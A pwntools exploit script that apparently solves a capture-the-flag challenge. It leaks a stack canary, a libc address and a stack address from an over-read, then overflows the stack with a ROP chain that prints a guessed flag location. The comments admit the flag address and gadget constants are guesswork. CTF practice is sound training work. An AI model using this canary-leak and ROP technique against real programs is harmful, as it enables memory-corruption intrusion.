#!/usr/bin/env python3
# This template is created by ZD (former helper and PWN player) and many more PWN players
# Special thanks to them!
from pwn import *

# ----------------------Packing Utils----------------------#
p64 = lambda n: packing.pack(n, 64)
u64 = lambda n: packing.unpack(n, 64)
u32 = lambda n: packing.unpack(n, 32)
uu64 = lambda data: u64(data.ljust(8, b"\x00"))
uu32 = lambda data: u32(data.ljust(4, b"\x00"))
# ---------------------Common Settings---------------------#
bin_path = "./unsetenv_patched"  # put the executable name here
local_libc_path = "libc.so.6"
remote_url = "localhost"
remote_port = 1338  # remember to change the port here

context.log_level = "debug"
context.binary = bin_path

gdb_break_points = [
    # add addresses or symbols or symbol+offset here to set break point automatically
    # e.g. 'main','main+16','0x400500'
    "main+282"  # , 'main+149'
]


# ---------------------------------------------------------#
# ------------------------Exploit--------------------------#
# ---------------------------------------------------------#
def initialize_io(mode: str) -> process | remote:
    gdbscripts = "handle SIGALRM ignore\n"
    for bp in gdb_break_points:
        if bp:  # is not empty str
            gdbscripts += f"b* {bp}\n"
    if mode == "_debug":
        # context.terminal = ["tmux", "splitw", "-h"]
        # uncomment the previous line to use split terminal instead of opening a new terminal
        # this only works if you are using tmux
        return gdb.debug(bin_path, gdbscripts)
    elif mode == "_local":
        return process(bin_path)
    elif mode == "_remote":
        return remote(remote_url, remote_port)
    else:
        exit(-1)


import time


# -----------------------Main Pwn--------------------------#
def do_pwn(io: process | remote) -> None:
    sla = io.sendlineafter
    sa = io.sendafter
    sl = io.sendline
    sd = io.send
    rl = io.recvline
    ru = io.recvuntil
    rc = io.recv
    rop = ROP(bin_path)
    elf = ELF(bin_path)
    libc = ELF(local_libc_path)  # uncomment this line to set libc object

    def exploit() -> None:
        # canary
        sla(b"Enter the name of an environment variable: ", b"12345678")
        ru(b"\x0a")
        canary = b"\x00" + ru(b" ", drop=True)[:7]
        log.info(f"canary is {hex(u64(canary))}")

        # return addr (some libc address)
        sa(
            b"Enter the name of an environment variable: ",
            b"BBBBBBBB" + b"CCCCCCCC" + b"DDDDDDDD",
        )
        ru(b"DDDDDDDD")
        ret_addr = u64(ru(b" ", drop=True).ljust(8, b"\x00")[:8])
        log.info(f"return address is {hex(ret_addr)}")
        libc.address = ret_addr - (libc.sym["__libc_start_main"] - 0x30)
        log.info(f"libc base is {hex(libc.address)}")

        # some address on the stack
        sa(b"Enter the name of an environment variable: ", b"E" * 32)
        ru(b"E" * 32)
        stack_addr = ru(b" ", drop=True).ljust(8, b"\x00")[:8]
        log.info(f"stack address is {hex(u64(stack_addr))}")
        log.info(f"flag maybe at {hex(u64(stack_addr))[:-4] + hex(int(hex(u64(stack_addr))[-4], 16) + 2)[2:] + 'fc0'}")
        # super duper extra guessing to get the flag address maybe idk
        # keep running the script until it prints the flag lol, modyfiy the fc0 part if it prints incomplete flag
        flag_loc = int((hex(u64(stack_addr))[:-4] + hex(int(hex(u64(stack_addr))[-4], 16) + 2)[2:] + 'fc0')[2:], 16)

        # send shit over
        sa(
            b"below:\x0a",
            flat(
                b"A" * 8,
                canary,
                b"B" * 8,
                p64(
                    0x7F387C450440 - 0x7F387C3CBE10 + libc.sym["getenv"]
                ),  # magical bullshit constants for pop rdi from libc
                p64(flag_loc),  # flag address
                p64(libc.sym["printf"]),
            ),
        )

        return  # write your solve here

    exploit()


# ---------------------------------------------------------#
# --------------------End of Exploit-----------------------#
# ---------------------------------------------------------#
def main():
    mode = "_local"
    mode = "_remote"
    # mode = "_debug"  # comment this line to change from local debugging to remote exploitation
    io = initialize_io(mode)
    do_pwn(io)
    io.interactive()


if __name__ == "__main__":
    main()
# ----------------------------EOF---------------------------#
